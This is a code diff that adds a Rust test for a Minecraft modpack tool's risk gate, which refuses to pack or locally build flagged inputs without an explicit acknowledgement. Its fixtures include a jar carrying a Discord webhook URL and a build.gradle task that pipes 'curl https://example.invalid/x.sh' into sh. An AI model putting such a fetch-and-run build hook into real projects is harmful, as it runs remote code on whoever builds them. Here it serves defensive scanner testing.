@@ -873,3 +873,138 @@ fn ai_gate_cancel_means_reject() {
         "the gate must reject on cancel: no apply, no checkpoint"
     );
 }
+
+// ---- 11.A7: risk gate for pack and local build ----
+
+use ummp_core::app::helpers::NoIndex;
+use ummp_core::app::{BuildJobRequest, PackRequest};
+
+fn zip_bytes(entries: &[(&str, Vec<u8>)]) -> Vec<u8> {
+    use std::io::Write;
+    let mut buf = std::io::Cursor::new(Vec::new());
+    {
+        let mut z = zip::ZipWriter::new(&mut buf);
+        for (name, bytes) in entries {
+            z.start_file(*name, zip::write::FileOptions::default())
+                .unwrap();
+            z.write_all(bytes).unwrap();
+        }
+        z.finish().unwrap();
+    }
+    buf.into_inner()
+}
+
+fn fabric_jar(id: &str) -> Vec<u8> {
+    let desc = serde_json::json!({
+        "schemaVersion": 1, "id": id, "version": "1.0.0", "name": id, "environment": "*",
+        "depends": { "fabricloader": ">=0.15.0", "minecraft": "1.21.1" }
+    });
+    zip_bytes(&[("fabric.mod.json", desc.to_string().into_bytes())])
+}
+
+/// A jar with a webhook URL in a resource: the scanner rates it High.
+fn evil_jar() -> Vec<u8> {
+    zip_bytes(&[
+        (
+            "fabric.mod.json",
+            br#"{"schemaVersion":1,"id":"evil","version":"1.0.0","depends":{"minecraft":"1.21.1"}}"#
+                .to_vec(),
+        ),
+        (
+            "evil.properties",
+            b"hook=https://discord.com/api/webhooks/1/abc\n".to_vec(),
+        ),
+    ])
+}
+
+fn pack_req(input: PathBuf, output: PathBuf, allow_risk: bool) -> PackRequest {
+    PackRequest {
+        input,
+        to: "1.21.1".into(),
+        loader: "fabric".into(),
+        output: Some(output),
+        allow_risk,
+        ..PackRequest::default()
+    }
+}
+
+fn high_risk_project(dir: &Path) -> PathBuf {
+    let bad = dir.join("badproj");
+    std::fs::create_dir(&bad).unwrap();
+    std::fs::write(
+        bad.join("build.gradle"),
+        "plugins { id 'java' }\ntask setup(type: Exec) {\n  commandLine 'sh', '-c', 'curl https://example.invalid/x.sh | sh'\n}\n",
+    )
+    .unwrap();
+    bad
+}
+
+/// ★ mutation: drop the risk check in `start_build`, or pass `allow_risk` through as `true`
+/// in `start_pack`, and this goes red: a High-risk input would be built or exported.
+#[test]
+fn high_risk_input_refuses_pack_and_local_build_without_ack() {
+    let d = tempdir().unwrap();
+    let svc = services(d.path());
+    let rx = collect(&svc);
+
+    // Pack: refused without the acknowledgement; nothing is exported, only the report.
+    let pack = d.path().join("demo-pack");
+    std::fs::create_dir_all(pack.join("mods")).unwrap();
+    std::fs::write(pack.join("mods/a.jar"), fabric_jar("a")).unwrap();
+    std::fs::write(pack.join("mods/evil.jar"), evil_jar()).unwrap();
+    let out = d.path().join("out");
+    let job = svc
+        .start_pack(
+            pack_req(pack.clone(), out.clone(), false),
+            Arc::new(NoIndex),
+        )
+        .unwrap();
+    let done = until_kind(&rx, job, "job.finished");
+    assert_eq!(done.payload["state"], "Failed", "{:?}", done.payload);
+    assert!(
+        done.payload["error"].as_str().unwrap().contains("risk"),
+        "{:?}",
+        done.payload
+    );
+    assert!(
+        !out.join("instance").exists(),
+        "a refused pack must not be exported"
+    );
+    assert!(out.join("UMMP_PACK_REPORT.md").is_file());
+
+    // The same pack, acknowledged: exported like any other.
+    let out2 = d.path().join("out2");
+    let job = svc
+        .start_pack(pack_req(pack, out2.clone(), true), Arc::new(NoIndex))
+        .unwrap();
+    let done = until_kind(&rx, job, "job.finished");
+    assert_eq!(done.payload["state"], "Succeeded", "{:?}", done.payload);
+    assert!(out2.join("instance/mods/a.jar").is_file());
+
+    // Local build: refused before any job exists. GitHub builds only warn.
+    let bad = high_risk_project(d.path());
+    let local = BuildJobRequest {
+        path: bad.clone(),
+        local: true,
+        ..BuildJobRequest::default()
+    };
+    assert!(matches!(svc.start_build(local), Err(AppError::Refused(_))));
+    assert!(matches!(
+        svc.check_build_risk(&bad, true, false, false),
+        Err(AppError::Refused(_))
+    ));
+    assert_eq!(
+        svc.check_build_risk(&bad, true, true, false).unwrap(),
+        Some(RiskLevel::High),
+        "an explicit acknowledgement lets a High-risk local build through the check"
+    );
+    assert_eq!(
+        svc.check_build_risk(&bad, false, false, false).unwrap(),
+        Some(RiskLevel::High),
+        "a GitHub build runs on a disposable runner: warn, do not refuse"
+    );
+    let clean = svc
+        .check_build_risk(&fixture("loader/fabric-src"), true, false, false)
+        .unwrap();
+    assert_eq!(clean, None);
+}
